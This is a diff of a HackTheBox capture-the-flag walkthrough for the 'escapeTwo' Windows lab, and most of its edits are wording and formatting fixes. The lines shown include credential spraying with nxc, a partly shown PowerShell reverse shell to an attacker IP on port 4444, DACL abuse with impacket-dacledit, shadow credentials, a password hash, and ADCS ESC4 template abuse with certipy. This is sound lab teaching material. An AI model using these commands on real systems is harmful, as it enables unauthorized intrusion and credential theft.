@@ -12,7 +12,7 @@ tags:
 - acl
 title: escapeTwo @ HackTheBox
 ---
-escapeTwo is an easy Windows machine on [hackthebox.eu](https://www.hackthebox.eu). Low privileged user creds are provided from the start. Using these creds on an SMB share provides a corrupted xlsx document, fixing the magic bytes provides several usernames and passwords. spraying these creds across the network reveals credentials for a 'mssql' account, gaining us initial access. Enumeration of the system reveals 'SQL' credentials, which once sprayed across the domain, allows us to gain access via winrm. Using bloodhound extensively shows write-owner over an account. With this account, we can enumerate 'ADCS', revealing a misconfigured Active Directory Certificate Service. Exploiting this misconfiguration allows us to obtain the administrator hash.
+escapeTwo is an easy Windows machine on [hackthebox.eu](https://www.hackthebox.eu). Low privileged user creds are provided from the start. Using these creds on an SMB share provides a corrupted xlsx document, fixing the magic bytes provides several usernames and passwords. Spraying these creds across the network reveals credentials for a 'mssql' account, gaining us initial access. Enumeration of the system reveals 'SQL' credentials, which once sprayed across the domain, allows us to gain access via winrm. Using bloodhound extensively shows write-owner over an account. With this account, we can enumerate 'ADCS', revealing a misconfigured Active Directory Certificate Service. Exploiting this misconfiguration allows us to obtain the administrator hash.
 
 ## User & Root Flag
 This post is a walkthrough for escapeTwo, an medium machine on [hackthebox.eu](https://www.hackthebox.eu). 
@@ -103,6 +103,7 @@ Host script results:
 ```
 ## Initial Access
 Running smbmap shows two unique directorys.
+We will ignore the `users` and only focus on `Accounting Department`.
 ```
 ┌──(tsunami㉿coffee)-[~]
 └─$ smbmap -u rose -p 'KxEPkKe6R8su' -H 10.129.232.128
@@ -120,7 +121,7 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
 
 [*] Detected 1 hosts serving SMB                                                                                                  
 [*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
-                                                                                                                             
+                                                                                                                       
 [+] IP: 10.129.232.128:445      Name: sequel.htb                Status: Authenticated
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
@@ -133,16 +134,17 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
         Users                                                   READ ONLY
 [*] Closed 1 connections 
 ```
-Downloading the files inside of Accounting Department, we find that both files have been corrupted, changing the magicbytes allows us to read the file.
-[magicbytes](https://en.wikipedia.org/wiki/List_of_file_signatures)
+Downloading the files inside of Accounting Department, we find that both files have been corrupted, changing the magicbytes allows us to read the file.<br>
+[magicbyte - list of signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)<br>
+Look up 'xlsx' and copy the first few magic bytes.
 ```
 hexedit accounts.xlsx
 // replace the few characters to: 50 4B 03 04
 ```
 ![capture-1](capture-1.PNG)
-This reveals an accounts document.
-![capture-2](accounts.PNG)
-Spraying these usernames and passwords does not yield any results, instead we have to target the mssql account.
+Opening the file reveals several usernames and passwords.
+![capture-2](accounts.PNG)<br>
+Use NXC mssql with local-auth to gain access to the account.
 ```
 nxc mssql 10.129.232.128 -u usernames.txt -p passwords.txt -d sequel.htb --local-auth
 ```
@@ -163,8 +165,8 @@ $client = New-Object System.Net.Sockets.TCPClient('10.10.16.48',4444);$stream = 
 ```
 
 ## sql_svc
-After gaining a reverse shell as sql_svc, going to `C:\', we find a 'SQL2019' directory which reveals some credentials.
-![capture-5](capture-5.PNG)
+After gaining a reverse shell as sql_svc, going to `C:\`, we find a `SQL2019` directory which reveals some credentials.
+![capture-5](capture-5.PNG)<br>
 Spraying this password across the network reveals a new user.
 ```
 nxc smb 10.129.232.128 -u usernames.txt -p passwords.txt -d sequel.htb --continue-on-success
@@ -188,7 +190,7 @@ impacket-dacledit -action write -rights FullControl -principal ryan -target ca_s
 ![capture-9](capture-9.PNG)
 <div style="text-align: center;">
   ⚠️ <strong>READ ME IF STUCK</strong> ⚠️<br>
-  If for whatever reason the next step DOES NOT WORK, re-run the previous two steps. AND re-run the dacledit twice.
+  If for whatever reason the next step <b>DOES NOT WORK</b>, re-run the previous two steps. AND re-run the dacledit twice.
 </div>
 <br>
 Once we have written our FullControl DACL edit, we can finally create a shadow credential.
@@ -198,11 +200,11 @@ certipy-ad shadow auto -u "ryan@sequel.htb" -p "WqSZAF6CysDQbGb3" -account "ca_s
 
 ![capture-10](capture-10.PNG)
 
-Using this hash, we can exploit ESC4.
+Using this hash, we can exploit ESC4 (which will turn into ESC1)
 ```
 certipy-ad find -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -stdout -vuln
 ```
-![capture-11](capture-11.PNG)
+![capture-11](capture-11.PNG)<br>
 This verify's that the cert publisher is vulnerable to a ESC4 exploit.
 ```
 certipy-ad template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration
